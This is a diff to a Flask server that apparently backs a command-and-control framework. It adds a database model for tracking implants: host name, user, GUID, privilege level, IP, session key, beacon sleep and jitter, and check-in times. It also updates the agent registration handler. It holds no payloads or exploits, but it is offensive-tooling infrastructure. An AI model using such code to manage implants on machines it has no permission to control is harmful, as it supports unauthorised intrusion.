@@ -1,6 +1,6 @@
 from flask import Flask , request, jsonify, redirect, render_template, url_for
 from flask_sqlalchemy import SQLAlchemy ## inherently handles syncronization for us ##
-from sqlalchemy import Column, Integer, String, ForeignKey, Table
+from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
 import hashlib
 
 
@@ -53,16 +53,37 @@ class Task(db.Model): # a SQLAlchemy class
     Status = db.Column(db.String(288))
     agent_id = db.Column(db.String(288))
 
-class Agent(db.Model): # a SQLAlchemy class
-    id = db.Column(db.Integer, primary_key=True)
-    agent_id = db.Column(db.String(288))
-    whoami = db.Column(db.String(288))
-    password = db.Column(db.String(288))
+# class Agent(db.Model): # a SQLAlchemy class
+#     id = db.Column(db.Integer, primary_key=True)
+#     agent_id = db.Column(db.String(288))
+#     whoami = db.Column(db.String(288))
+#     password = db.Column(db.String(288))
 
 class Client(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     client_id = db.Column(db.String(288))
     password = db.Column(db.String(288))
+    # implants = db.relationship("Agent", backref='agent', lazy=True)
+
+class Agent(db.Model): 
+    id               = db.Column(db.Integer, primary_key = True)
+    agent_id         = db.Column(db.String(288))
+    password         = db.Column(db.String(288)) # secret key that verifies the agent with server
+    computer_name    = db.Column(db.String(288)) # what computer did it connect from
+    username         = db.Column(db.String(80)) # what user are you running as
+    GUID             = db.Column(db.String(288)) # computer's GUID
+    Integrity        = db.Column(db.String(288)) # what privileges do you have
+    ip_address       = db.Column(db.String(32))  # what address did the implant connect from
+    session_key      = db.Column(db.String(288)) # after you negotiated a session key, store it per agent
+    sleep            = db.Column(db.Float)       # how often does the agent check in 
+    jitter           = db.Column(db.Float)       # how random of a check in is it
+    first_seen       = db.Column(db.DateTime)    # when did the agent first check in
+    last_seen        = db.Column(db.DateTime)    # when was the last time you saw the agent
+    expected_checkin = db.Column(db.DateTime)    # when should you expect to see the agent again
+    #TODO            : a func to generate a new python datatime for expected checkin
+
+
+    
 
 # search agent by agent_id
 # link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
@@ -131,13 +152,13 @@ def register_agent(): # --> this is a handler
     reg_whoami = reg_data["whoami"]
     reg_agent_id = reg_data["agent_id"]
 
-    agent = Agent(agent_id=reg_agent_id, whoami=reg_whoami, password=hash_passoword(reg_password))
+    agent = Agent(agent_id=reg_agent_id, username=reg_whoami, password=hash_passoword(reg_password))
     db.session.add(agent)
     db.session.commit() ## saves the data to the database
 
      #TODO: need to change this part so that password is properly verified
     if verify_agent_password(reg_agent_id, reg_password):
-        print(f"[+] a new agent has successfully registered: {agent.agent_id}, {agent.whoami}")
+        print(f"[+] a new agent has successfully registered: {agent.agent_id}, {agent.username}")
     else:
         # print("[-] authentication failed")
         return jsonify({"status": "authentication failed"})
